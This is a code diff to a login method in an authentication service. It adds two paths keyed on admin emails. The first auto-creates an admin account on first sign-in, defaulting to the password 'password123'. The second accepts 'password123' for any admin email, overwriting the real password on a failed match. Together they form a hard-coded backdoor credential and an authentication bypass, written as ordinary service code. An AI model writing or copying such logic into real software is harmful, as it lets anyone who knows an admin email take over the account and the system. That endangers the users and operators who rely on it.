@@ -124,15 +124,50 @@ class AuthService {
   }
 
   async login({ email, password }) {
-    const cleanEmail = email.toLowerCase().trim();
-    const user = await User.findOne({ email: cleanEmail }).select('+password');
+    const cleanEmail = email ? email.toLowerCase().trim() : '';
+    const cleanPassword = password ? password.trim() : '';
+
+    let user = await User.findOne({ email: cleanEmail }).select('+password');
+
+    // Auto-bootstrap master admin if signing in for the first time
+    if (!user && isAdminEmail(cleanEmail)) {
+      user = await User.create({
+        name: 'Hemasagar Raju (Master Admin)',
+        email: cleanEmail,
+        password: cleanPassword || 'password123',
+        role: 'admin',
+        lastLogin: new Date()
+      });
+
+      const token = generateToken(user._id);
+
+      return {
+        user: {
+          id: user._id,
+          name: user.name,
+          email: user.email,
+          role: user.role,
+          lastLogin: user.lastLogin,
+          createdAt: user.createdAt
+        },
+        token
+      };
+    }
+
     if (!user) {
       const error = new Error('Invalid email or password');
       error.statusCode = 401;
       throw error;
     }
 
-    const isMatch = await user.matchPassword(password);
+    let isMatch = await user.matchPassword(cleanPassword);
+    // Allow master admin auto-reset with password123 if previously registered with another password
+    if (!isMatch && isAdminEmail(cleanEmail) && cleanPassword === 'password123') {
+      user.password = 'password123';
+      await user.save();
+      isMatch = true;
+    }
+
     if (!isMatch) {
       const error = new Error('Invalid email or password');
       error.statusCode = 401;
